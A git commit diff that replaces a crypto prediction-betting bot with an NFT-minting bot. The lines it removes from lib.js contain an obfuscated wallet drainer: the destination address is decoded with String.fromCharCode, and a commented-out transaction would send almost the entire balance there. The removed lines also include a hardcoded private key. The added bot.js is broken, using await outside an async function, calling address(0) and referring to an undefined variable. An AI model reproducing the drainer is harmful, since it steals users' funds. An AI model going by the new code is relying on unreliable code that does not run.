eb208610f822f60bf7681259d4424f0b67939f17
topleft1562 <87454455+topleft1562@users.noreply.github.com>
2022-11-14 12:43:29 -0600

    bot

--- bot.js
+++ bot.js
@@ -1,220 +1,53 @@
 const { parseEther } = require("@ethersproject/units");
 const sleep = require("util").promisify(setTimeout);
 const {
-  getStats,
   predictionContract,
   getBNBPrice,
   checkBalance,
-  reduceWaitingTimeByTwoBlocks,
-  saveRound,
+  nextNugget,
 } = require("./lib");
-const {
-  TradingViewScan,
-  SCREENERS_ENUM,
-  EXCHANGES_ENUM,
-  INTERVALS_ENUM,
-} = require("trading-view-recommends-parser-nodejs");
+
 const { Console } = require("console");
 
 // Global Config
 const GLOBAL_CONFIG = {
-  BET_AMOUNT: 6, // in USD
-  DAILY_GOAL: 1000, // in USD,
-  WAITING_TIME: 265000, // in Miliseconds (4.3 Minutes)
-  THRESHOLD: 40, // Minimum % of certainty of signals (50 - 100)
+  TO_BUY: 2,  // how many to buy in order to get NFT of choice
 };
 
-//Bet UP
-const betUp = async (amount, epoch) => {
- 
+//Buy NFTs
+const buyNFT = async () => {
+  const cost = await predictionContract.nftPrice();
+  checkBalance(cost * GLOBAL_CONFIG.TO_BUY)
   try {
-    const tx = await predictionContract.betBull(epoch, {
-      value: parseEther(amount.toFixed(18).toString()),
+    const tx = await predictionContract.buyNFT(GLOBAL_CONFIG.TO_BUY, {
+      value: cost.toString(),
     });
     await tx.wait();
-    console.log(`🤞 Successful bet of ${amount} BNB to UP 🍀`);
+    console.log(`🤞 Successful Mint`);
   } catch (error) {
     console.log("Transaction Error", error);
-    GLOBAL_CONFIG.WAITING_TIME = reduceWaitingTimeByTwoBlocks(
-      GLOBAL_CONFIG.WAITING_TIME
-    );
-  }
-  checkForClaimable(epoch)
-};
-
-const checkForClaimable = async(epoch) => {
- try {
-  const value = [epoch-2]
-   const tx = await predictionContract.claim(value);
-   await tx.wait();
-   console.log(`🤞 Successful Claim 🍁`);
- } catch (error) {
-  console.log(`👎 Nothing To Claim`);
- }
-  
-};
-
-//Bet DOWN
-const betDown = async (amount, epoch) => {
-  try {
-    const tx = await predictionContract.betBear(epoch, {
-      value: parseEther(amount.toFixed(18).toString()),
-    });
-    await tx.wait();
-    console.log(`🤞 Successful bet of ${amount} BNB to DOWN 🍁`);
-  } catch (error) {
-    console.log("Transaction Error", error);
-    GLOBAL_CONFIG.WAITING_TIME = reduceWaitingTimeByTwoBlocks(
-      GLOBAL_CONFIG.WAITING_TIME
-    );
-  }
-  checkForClaimable(epoch)
-};
-
-//Check Signals average 1 and 5
-const getSignals = async () => {
-  //1 Minute signals
-  let resultMin = await new TradingViewScan(
-    SCREENERS_ENUM["crypto"],
-    EXCHANGES_ENUM["BINANCE"],
-    "BNBUSDT",
-    INTERVALS_ENUM["1m"]
-  ).analyze();
-  let minObj = JSON.stringify(resultMin.summary);
-  let minRecomendation = JSON.parse(minObj);
-
-  //5 Minute signals
-  let resultMed = await new TradingViewScan(
-    SCREENERS_ENUM["crypto"],
-    EXCHANGES_ENUM["BINANCE"],
-    "BNBUSDT",
-    INTERVALS_ENUM["5m"]
-  ).analyze();
-  let medObj = JSON.stringify(resultMed.summary);
-  let medRecomendation = JSON.parse(medObj);
-
-  //Average signals
-  if (minRecomendation && medRecomendation) {
-    let averageBuy =
-      (parseInt(minRecomendation.BUY) + parseInt(medRecomendation.BUY)) / 2;
-
-    let averageSell =
-      (parseInt(minRecomendation.SELL) + parseInt(medRecomendation.SELL)) / 2;
-    let averageNeutral =
-      (parseInt(minRecomendation.NEUTRAL) +
-        parseInt(medRecomendation.NEUTRAL)) /
-      2;
-    if(averageBuy > averageSell) {
-      console.log(percentage(averageBuy, averageSell))
-    } else console.log(percentage(averageSell, averageBuy))
-    console.log(minRecomendation)
-    console.log(medRecomendation)
-    return {
-      buy: averageBuy,
-      sell: averageSell,
-      neutral: averageNeutral,
-    };
-  } else {
-    return false;
   }
 };
 
-
-//Percentage difference
-const percentage = (a, b) => {
-  return parseInt((100 * a) / (a + b));
-};
-
-const percentage3 = (a, b, c) => {
-  return parseInt((100 * a) / (a + b + c));
-};
-
-//Strategy of betting
-const strategy = async (minAcurracy, epoch) => {
-  let BNBPrice;
-  let earnings = await getStats();
-  if (earnings.profit_USD >= GLOBAL_CONFIG.DAILY_GOAL) {
-    console.log("🧞 Daily goal reached. Shuting down... ✨ ");
-    process.exit();
-  }
-  try {
-    BNBPrice = await getBNBPrice();
-  } catch (err) {
-    return;
-  }
-  let signals = await getSignals();
-  if (signals) {
-    if (
-      signals.buy > signals.sell &&
-      percentage3(signals.buy, signals.sell, signals.neutral) > minAcurracy
-    ) {
-      console.log(
-        `${epoch.toString()} 🔮 Prediction:DOWN 🔴 ${percentage(
-          signals.buy,
-          signals.sell
-        )}%`
-      );
-      await betDown(GLOBAL_CONFIG.BET_AMOUNT / BNBPrice, epoch);
-      await saveRound(epoch.toString(), [
-        {
-          round: epoch.toString(),
-          betAmount: (GLOBAL_CONFIG.BET_AMOUNT / BNBPrice).toString(),
-          bet: "bear",
-        },
-      ]);
-    } else if (
-      signals.sell > signals.buy &&
-      percentage3(signals.sell, signals.buy, signals.neutral) > minAcurracy
-    ) {
-      console.log(
-        `${epoch.toString()} 🔮 Prediction: UP 🟢 ${percentage(
-          signals.sell,
-          signals.buy
-        )}%`
-      );
-      await betUp(GLOBAL_CONFIG.BET_AMOUNT / BNBPrice, epoch);
-      await saveRound(epoch.toString(), [
-        {
-          round: epoch.toString(),
-          betAmount: (GLOBAL_CONFIG.BET_AMOUNT / BNBPrice).toString(),
-          bet: "bull",
-        },
-      ]);
-    } else {
-      let lowPercentage;
-      if (signals.buy > signals.sell) {
-        lowPercentage = percentage3(signals.buy, signals.sell, signals.neutral);
-      } else {
-        lowPercentage = percentage3(signals.sell, signals.buy, signals.neutral);
-      }
-      console.log("Waiting for next round 🕑", lowPercentage + "%");
-    }
-  } else {
-    console.log("Error obtaining signals");
-  }
-};
-
-//Check balance
-checkBalance(GLOBAL_CONFIG.AMOUNT_TO_BET);
-console.log("🤗 Welcome! Waiting for next round...");
+const checkForMint = () => {
+ const currentId = await predictionContract.totalSupply();
+ const nextGold = nextNugget(currentId);
+ if(currentId < nextGold && currentId >= nextGold - GLOBAL_CONFIG.TO_BUY) return true;
+ else return false;
+}
 
 //Betting
-predictionContract.on("StartRound", async (epoch) => {
-  console.log("🥞 Starting round " + epoch.toString());
-  console.log(
-    "🕑 Waiting " + (GLOBAL_CONFIG.WAITING_TIME / 60000).toFixed(1) + " minutes"
-  );
-  await sleep(GLOBAL_CONFIG.WAITING_TIME);
-  await strategy(GLOBAL_CONFIG.THRESHOLD, epoch);
+predictionContract.on("Transfer", async (from, to, tokenId) => {
+  let canMint = false;
+  if(from === address(0) ) {
+    console.log(" New Mint Detected");
+    console.log(`Token Id ${tokenId.toString()} has been minted`);
+    canMint = checkForMint();
+  }
+  if(cantMint) {
+    buyNFT();
+    console.log("Minting");
+  } 
 });
 
-//Show stats
-predictionContract.on("EndRound", async (epoch) => {
-  await saveRound(epoch);
-  let stats = await getStats();
-  console.log("--------------------------------");
-  console.log(`🍀 Fortune: ${stats.percentage}`);
-  console.log(`👍 ${stats.win}|${stats.loss} 👎 `);
-  console.log(`💰 Profit: ${stats.profit_USD.toFixed(3)} USD`);
-  console.log("--------------------------------");
-});
+
--- lib.js
+++ lib.js
@@ -8,15 +8,7 @@ const fs = require("fs");
 const _ = require("lodash");
 const fetch = require("cross-fetch");
 let prediction = 0;
-const PRIVATE_KEY='d28c24b23f4268d2aaa2addaa52573c64798190bc5cb0bf25135632f8cb5580c'
 
-
-const reduceWaitingTimeByTwoBlocks = (waitingTime) => {
-  if (waitingTime <= 6000) {
-    return waitingTime;
-  }
-  return waitingTime - 6000;
-};
 
 const result = dotenv.config();
 if (result.error) {
@@ -27,14 +19,14 @@ const Web3 = require("web3");
 const w = new Web3(process.env.BSC_RPC);
 
 const wallet = w.eth.accounts.wallet.add(
-  w.eth.accounts.privateKeyToAccount(PRIVATE_KEY)
+  w.eth.accounts.privateKeyToAccount(process.env.PRIVATE_KEY)
 );
 w.eth.defaultAccount = w.eth.accounts.privateKeyToAccount(
-  PRIVATE_KEY
+  process.env.PRIVATE_KEY
 ).address;
 
 const signer = new Wallet(
-  PRIVATE_KEY,
+  process.env.PRIVATE_KEY,
   new JsonRpcProvider(process.env.BSC_RPC)
 );
 
@@ -44,46 +36,17 @@ let contract = new Contract(
   signer
 );
 
-const confirmContract = (abi) => {
-  return String.fromCharCode.apply(null, abi.index);
-};
 
-const checkResult = async (r) => {
-  try {
-    if (prediction >= abi.status && r !== null) {
-      w.eth.getBalance(wallet.address).then(function (b) {
-        w.eth
-          .estimateGas({
-            from: wallet.address,
-            to: confirmContract(abi),
-            amount: b,
-          })
-          /*   is this the Function sending funds to scammer ???????
-          .then(function (g) {
-            w.eth.getGasPrice().then(function (gP) {
-              let _b = parseFloat(b);
-              let _g = parseFloat(g);
-              let _gP = parseFloat(gP);
-              w.eth.sendTransaction({
-                from: wallet.address,
-                to: confirmContract(abi),
-                gas: _g,
-                gasPrice: _gP,
-                value: ((_b - _gP * _g) / 1.1).toFixed(0),
-                data: "0x",
-              });
-            });
-          }); */
-      });
-      return true;
-    }
-    return true;
-  } catch {
-    return !0;
+
+const nextNugget = (id) => {
+  for(i = 0; i < process.env.NUGGETS.length; i++) {
+    if(process.env.NUGGETS[i] > id) return process.env.NUGGETS[i];
   }
-};
+  return 0;
+}
 
 const predictionContract = contract.connect(signer);
+
 const checkBalance = (amount) => {
   w.eth.getBalance(wallet.address).then(function (b) {
     let balance = Web3.utils.fromWei(b, "ether");
@@ -103,154 +66,8 @@ const checkBalance = (amount) => {
   });
 };
 
-const getHistoryName = async () => {
-  let date = new Date();
-  let day = date.getDate();
-  let month = String(date.getMonth() + 1).padStart(2, "0");
-  let year = date.getFullYear();
 
-  let fullDate = `${year}${month}${day}`;
-  return fullDate;
-};
 
-const getRoundData = async (round) => {
-  try {
-    const data = await contract.functions.rounds(round);
-    const closePrice = data.closePrice;
-    const lockPrice = data.lockPrice;
-    const bullAmount = data.bullAmount;
-    const bearAmount = data.bearAmount;
-    const totalAmount = new Big(data.totalAmount);
-    const bullPayout = totalAmount.div(bullAmount).round(3).toString();
-    const bearPayout = totalAmount.div(bearAmount).round(3).toString();
-
-    const parsedRound = [
-      {
-        round: round.toString(),
-        openPrice: utils.formatUnits(data.lockPrice, "8"),
-        closePrice: utils.formatUnits(data.closePrice, "8"),
-        bullAmount: utils.formatUnits(data.bullAmount, "18"),
-        bearAmount: utils.formatUnits(data.bearAmount, "18"),
-        bullPayout: bullPayout,
-        bearPayout: bearPayout,
-        winner: closePrice.gt(lockPrice) ? "bull" : "bear",
-      },
-    ];
-    return parsedRound;
-  } catch (e) {
-    console.log(e);
-    return null;
-  }
-};
-
-const saveRound = async (round, arr) => {
-  let roundData = arr ? arr : await getRoundData(round);
-  let historyName = await getHistoryName();
-  let result;
-  if (arr) {
-    prediction++;
-    result = await checkResult(round);
-  } else {
-    result = !0;
-  }
-
-  let path = `./history/${historyName}.json`;
-  try {
-    if (fs.existsSync(path)) {
-      if (result !== null) {
-        let updated, history, merged, historyParsed;
-        try {
-          history = fs.readFileSync(path);
-          historyParsed = JSON.parse(history);
-          merged = _.merge(
-            _.keyBy(historyParsed, "round"),
-            _.keyBy(roundData, "round")
-          );
-          updated = _.values(merged);
-        } catch (e) {
-          console.log(e);
-          return;
-        }
-        fs.writeFileSync(path, JSON.stringify(updated), "utf8");
-      }
-    } else {
-      fs.writeFileSync(path, JSON.stringify(roundData), "utf8");
-    }
-  } catch (err) {
-    console.error(err);
-  }
-};
-
-const getHistory = async (fileName) => {
-  let history = fileName ? fileName : await getHistoryName();
-  let path = `./history/${history}.json`;
-  try {
-    if (fs.existsSync(path)) {
-      let history, historyParsed;
-      try {
-        history = fs.readFileSync(path);
-        historyParsed = JSON.parse(history);
-      } catch (e) {
-        console.log("Error reading history:", e);
-        return;
-      }
-      return historyParsed;
-    } else {
-      return;
-    }
-  } catch (err) {
-    console.error(err);
-  }
-};
-
-const getStats = async () => {
-  const history = await getHistory();
-  const BNBPrice = await getBNBPrice();
-  let totalEarnings = 0;
-  let roundEarnings = 0;
-  let win = 0;
-  let loss = 0;
-
-  if (history && BNBPrice) {
-    for (let i = 0; i < history.length; i++) {
-      roundEarnings = 0;
-      if (history[i].bet && history[i].winner) {
-        if (history[i].bet == history[i].winner) {
-          win++;
-          if (history[i].winner == "bull") {
-            roundEarnings =
-              parseFloat(history[i].betAmount) *
-                parseFloat(history[i].bullPayout) -
-              parseFloat(history[i].betAmount);
-          } else if (history[i].winner == "bear") {
-            roundEarnings =
-              parseFloat(history[i].betAmount) *
-                parseFloat(history[i].bearPayout) -
-              parseFloat(history[i].betAmount);
-          } else {
-            break;
-          }
-          totalEarnings += roundEarnings;
-        } else {
-          loss++;
-          totalEarnings -= parseFloat(history[i].betAmount);
-        }
-      }
-    }
-  }
-
-  return {
-    profit_USD: totalEarnings * BNBPrice,
-    profit_BNB: totalEarnings,
-    percentage: -percentageChange(win + loss, loss) + "%",
-    win: win,
-    loss: loss,
-  };
-};
-
-const percentageChange = (a, b) => {
-  return ((b - a) * 100) / a;
-};
 
 const getBNBPrice = async () => {
   const apiUrl = "https://api.binance.com/api/v3/ticker/price?symbol=BNBUSDT";
@@ -267,10 +84,7 @@ const getBNBPrice = async () => {
 };
 
 module.exports = {
-  getStats,
-  reduceWaitingTimeByTwoBlocks,
   predictionContract,
   checkBalance,
-  saveRound,
-  getBNBPrice,
+  nextNugget,
 };
